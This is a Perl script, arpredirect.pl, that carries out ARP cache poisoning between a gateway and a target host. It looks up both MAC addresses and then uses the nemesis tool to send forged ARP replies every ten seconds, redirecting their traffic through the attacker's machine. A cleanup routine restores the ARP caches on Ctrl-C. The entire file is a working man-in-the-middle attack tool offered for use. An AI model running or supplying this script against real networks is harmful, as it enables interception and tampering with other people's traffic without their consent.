#!/usr/bin/perl
# $Id: arpredirect.pl,v 1.1 2008-01-03 16:32:06 doros Exp $

$device = "eth0";

$SIG{INT} = \&cleanup;  # Trap for Ctrl-C, and send to cleanup
$flag = 1;
$gw = shift;            # First command line arg
$targ = shift;          # Second command line arg

if (($gw . "." . $targ) !~ /^([0-9]{1,3}\.){7}[0-9]{1,3}$/)
{  # Perform input validation; if bad, exit.
  die("Usage: arpredirect.pl <gateway> <target>\n");
}

# Quickly ping each target to put the MAC addresses in cache
print "Pinging $gw and $targ to retrieve MAC addresses...\n";
system("ping -q -c 1 -w 1 $gw > /dev/null");
system("ping -q -c 1 -w 1 $targ > /dev/null");

# Pull those addresses from the arp cache
print "Retrieving MAC addresses from arp cache...\n";
$gw_mac = qx[/usr/sbin/arp -na $gw];
$gw_mac = substr($gw_mac, index($gw_mac, ":")-2, 17);
$targ_mac = qx[/usr/sbin/arp -na $targ];
$targ_mac = substr($targ_mac, index($targ_mac, ":")-2, 17);

# If they're not both there, exit.
if($gw_mac  !~ /^([A-F0-9]{2}\:){5}[A-F0-9]{2}$/)
{
  die("MAC address of $gw not found.\n");
}

if($targ_mac  !~ /^([A-F0-9]{2}\:){5}[A-F0-9]{2}$/)
{
  die("MAC address of $targ not found.\n");
}
# Get your IP and MAC
print "Retrieving your IP and MAC info from ifconfig...\n";
@ifconf = split(" ", qx[/sbin/ifconfig $device]);
$me = substr(@ifconf[6], 5);
$me_mac = @ifconf[4];

print "[*] Gateway: $gw is at $gw_mac\n";
print "[*] Target:  $targ is at $targ_mac\n";
print "[*] You:     $me is at $me_mac\n";
while($flag)
{ # Continue poisoning until ctrl-C
  print "Redirecting:  $gw -> $me_mac <- $targ";
  system("nemesis arp -r -d $device -S $gw -D $targ -h $me_mac -m $targ_mac -H $me_mac -M $targ_mac");
  system("nemesis arp -r -d $device -S $targ -D $gw -h $me_mac -m $gw_mac -H $me_mac -M $gw_mac");
  sleep 10;
}

sub cleanup
{ # Put things back to normal
  $flag = 0;
print "Ctrl-C caught, exiting cleanly.\nPutting arp caches back to normal.";
  system("nemesis arp -r -d $device -S $gw -D $targ -h $gw_mac -m $targ_mac -H $gw_mac -M $targ_mac");
  system("nemesis arp -r -d $device -S $targ -D $gw -h $targ_mac -m $gw_mac -H $targ_mac -M $gw_mac");
}
